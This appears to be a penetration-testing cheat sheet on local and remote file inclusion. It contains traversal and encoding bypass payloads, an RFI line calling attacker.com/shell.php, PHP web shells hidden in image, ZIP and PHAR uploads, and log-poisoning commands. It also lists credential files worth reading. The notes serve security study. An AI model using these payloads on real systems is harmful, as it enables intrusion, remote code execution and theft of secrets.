## 📂 Local & Remote File Inclusion (LFI/RFI)

**Tags:** `#LFI` `#RFI` `#FileInclusion` `#RemoteFileInclusion` `#LocalFileInclusion`

File inclusion vulnerabilities occur when user input is used to construct file paths for dynamic page generation. These flaws can lead to information disclosure, code execution, or full system compromise.

**Reference:** [Barb'hack 2022: Leveraging PHP Local File Inclusion to achieve universal RCE - RiskInsight](https://www.riskinsight-wavestone.com/en/2022/09/barbhack-2022-leveraging-php-local-file-inclusion-to-achieve-universal-rce/)

---

### 🧠 Concepts

- **LFI (Local File Inclusion)** — Includes files from the local filesystem.
- **RFI (Remote File Inclusion)** — Includes files from remote servers (requires `allow_url_include` to be enabled).
- Commonly exploited when a parameter is used to dynamically load files (e.g., `?page=home`).

---

### 🧪 LFI Types

|**Type**|**Example**|
|---|---|
|**Basic LFI**|`/etc/passwd`, `C:\Windows\boot.ini`|
|**Path Traversal**|`../../../etc/passwd`|
|**Filename Prefix/Appending**|Application prepends/appends to the filename|
|**Second-Order LFI**|Inject payload into a log or DB, then trigger inclusion later|

---

### 🛠️ Bypass Techniques

#### 🔁 Path Traversal Filters

- Use alternate encodings:
    - `....//`, `%2e%2e%2f`, `%252e%252e%252f`
- Mix traversal with valid paths:
    - `./somefolder/../../../etc/passwd`

#### 🧱 Extension Handling

- Some apps auto-append extensions (e.g., `.php`)
- Use **path truncation** (long strings to exceed limits)
- Use **null byte injection** (`%00`) — legacy only

#### 🔍 Example Payloads

```text
?language=languages/../../../../../flag.txt
?language=languages%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag.txt
?language=languages/..//..//..//..//..//flag.txt
?language=languages/flag.txt%00
?language=./languages/%25%32%65%25%32%65%25%32%66%... (double-encoded)
```

---

### 🧪 PHP Filters

**Reference:**  [PHP: List of Available Filters - Manual](https://www.php.net/manual/en/filters.php)

- Use `php://filter` to read files without executing them:

```php
  php://filter/read=convert.base64-encode/resource=config
```

- Example:

```text
  ?language=php://filter/read=convert.base64-encode/resource=configure
```

---

### 🧪 PHP Wrappers

**Reference:** [PHP: List of Available Wrappers - Manual](https://www.php.net/manual/en/wrappers.php.php)

|**Wrapper**|**Purpose**|
|---|---|
|`php://input`|Accepts POST data as input|
|`php://filter`|Applies filters like base64 encoding|
|`data://`|Injects base64-encoded payloads|
|`expect://`|Executes commands (if enabled)|

#### 🔧 Examples

```bash
# Read php.ini as base64
curl "http://<IP>:<PORT>/?language=php://filter/read=convert.base64-encode/resource=../../php.ini"
```
![[Pasted image 20250520142201.png]]
![[Pasted image 20250417153826.png]]



---

### 🌐 Remote File Inclusion (RFI)

- Requires `allow_url_include = On` in `php.ini`
- Not all LFI are RFI — depends on function and config
- Test with:

```text
  ?language=http://attacker.com/shell.php&cmd=id
```
![[Pasted image 20250417153457.png]]

#### 🖥️ SMB-Based RFI (Windows)

```bash
# Host SMB share
impacket-smbserver -smb2support share $(pwd)

# Access via UNC path
?language=\\<attacker_ip>\<share>\shell.php&cmd=whoami
```

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|


---

### 📚 Function Behavior Comparison

|**Function**|**Read**|**Execute**|**Remote**|
|---|---|---|---|
|`include()` / `include_once()`|✅|✅|✅|
|`require()` / `require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()` / `file()`|✅|❌|❌|
|`php://input`|✅|✅|❌|
|`data://`|✅|✅|❌|
|`expect://`|✅|✅|❌|

---

### 🧬 LFI + File Uploads

Combining **LFI** with **file uploads** can lead to **Remote Code Execution (RCE)** if the application executes the uploaded file.

#### 🖼️ Image Payloads

- Inject PHP into an image file:

```
echo 'GIF8<?php system($_GET["PUT COMMAND HERE"]); ?>' > shell.gif
```

- Access via LFI:

```
  ?language=./profile_images/shell.gif&cmd=id
```

#### 📦 ZIP Payloads

- Requires the app to unzip files.
- Use `zip://` wrapper:

```bash
  echo '<?php system($_GET["PUT COMMAND HERE"]); ?>' > shell.php
  zip shell.jpg shell.php
```

- Access:

```
  ?language=zip://uploads/shell.jpg#shell.php&cmd=id
```

#### 🧪 PHAR Payloads

- Use `phar://` wrapper:

```php
  <?php
  $phar = new Phar('shell.phar');
  $phar->startBuffering();
  $phar->addFromString('shell.txt', '<?php system($_GET["PUT COMMAND HERE"]); ?>');
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering();
  ?>
```

- Compile and rename:

```bash
  php --define phar.readonly=0 shell.php
  mv shell.phar shell.jpg
```

- Access:

```
  ?language=phar://uploads/shell.jpg/shell.txt&cmd=id
```

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

---

### 🪵 Log Poisoning

- Inject PHP code into logs or session files, then include them via LFI.

#### 🧪 Examples

```bash
# Poison PHP session file
curl -s "http://<IP>:<PORT>/?language=<?php system($_GET['PUT COMMAND HERE']); ?>" --cookie "PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd"

# Access session file
?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

# Poison Apache log via User-Agent
curl -s "http://<IP>:<PORT>/" -A "<?php system($_GET['PUT COMMAND HERE']); ?>"

# Access Apache log
?language=/var/log/apache2/access.log&cmd=id
```

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

---

### 🤖 Automated Scanning

#### 🔍 Parameter Discovery
- [SecLists/Fuzzing/LFI/LFI-Jhaddix.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
- [File Inclusion/Path traversal - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<IP>:<PORT>/?FUZZ=value' -fs 2287
```

#### 🔍 LFI Payload Discovery

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<IP>:<PORT>/?language=FUZZ' -fs 2287
```

#### 🔍 Web Root Discovery
- [SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
- [SecLists/Discovery/Web-Content/default-web-root-directory-windows.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<IP>:<PORT>/?language=../../../../FUZZ/index.php' -fs 2287
```

#### 🔍 Manual Testing

```bash
curl http://<IP>:<PORT>/?language=../../../../etc/apache2/apache2.conf
```

#### 🔧 Tools

- [[liffy]]
- [[LFI Freak]]
- [[LFI Suite]]

---

### 📚 Function Behavior Comparison (Extended)

|**Function**|**Read**|**Execute**|**Remote URL**|
|---|---|---|---|
|`include()` / `include_once()`|✅|✅|✅|
|`require()` / `require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()` / `file()`|✅|❌|❌|
|`php://input`|✅|✅|❌|
|`data://`|✅|✅|❌|
|`expect://`|✅|✅|❌|
|`res.render()` (NodeJS)|✅|✅|❌|
|`import` (Java)|✅|✅|✅|
|`@Html.RemotePartial()` (.NET)|✅|❌|✅|
|`include` (.NET)|✅|✅|✅|

---

## 🧠 Additional Considerations & Advanced Techniques

### 🔄 LFI to RCE via Log Injection (Chained Exploits)

- Combine **LFI** with **log poisoning** and **command injection**:
    - Inject a command into a log file (e.g., via User-Agent).
    - Use LFI to include the log file.
    - If the included file is parsed as PHP, the command executes.

### 🧬 LFI to SSRF

- Some LFI vulnerabilities can be used to trigger **Server-Side Request Forgery**:
    - Include internal services like `/proc/self/environ`, `/proc/net/tcp`, or `/etc/hosts`.
    - If the app uses `file_get_contents()` or similar, it may allow SSRF via `http://localhost`.

### 🧪 LFI to Credential Theft

- Include files like:
    - `/etc/mysql/my.cnf` — MySQL credentials
    - `/var/www/html/.env` — Laravel/Node.js secrets
    - `/root/.bash_history` — Admin command history
    - `/etc/ssh/ssh_config` or `/etc/ssh/sshd_config`

### 🧰 Useful Linux Files for LFI

|**File**|**Purpose**|
|---|---|
|`/etc/passwd`|Usernames|
|`/etc/shadow`|Password hashes (if readable)|
|`/proc/self/environ`|Environment variables|
|`/proc/version`|Kernel version|
|`/var/log/auth.log`|Login attempts|
|`/var/log/apache2/access.log`|Web access logs|
|`/etc/hostname`|Hostname|
|`/etc/issue`|OS version|
|`/etc/crontab`|Scheduled tasks|

---
